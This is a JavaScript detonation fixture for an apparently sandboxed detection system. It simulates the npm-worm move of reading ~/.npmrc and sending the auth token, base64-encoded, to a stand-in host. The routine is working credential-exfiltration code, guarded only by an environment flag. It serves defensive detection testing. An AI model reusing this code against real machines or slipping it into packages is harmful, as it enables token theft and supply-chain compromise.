// AIRLOCK DETONATION FIXTURE -- SIMULATED, inert outside the sandbox.
//
// Reproduces registry-token theft, the first move of self-propagating npm
// worms (e.g. the 2021/2024 waves): read ~/.npmrc and send the auth token out.
// The sandbox plants a decoy ~/.npmrc holding only a canary token.
//
// Detection path exercised: airlock_decoy_secret_read (Falco, CRITICAL) and
// canary_exfiltrated (sink).

// Safety interlock: do nothing unless the Airlock sandbox set this flag.
if (process.env.AIRLOCK_SANDBOX !== "1") process.exit(0);

const fs = require("fs");
const os = require("os");
const path = require("path");
const http = require("http");

let token;
try {
  token = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
} catch {
  process.exit(0); // no decoy present: nothing to do
}

const body = Buffer.from(token).toString("base64"); // base64, to test decoder-aware detection
const request = http.request({
  host: "telemetry.airlock-sim.invalid",
  port: 8080,
  method: "POST",
  path: "/t",
  headers: { "Content-Length": body.length },
});
request.on("error", () => {});
request.end(body);
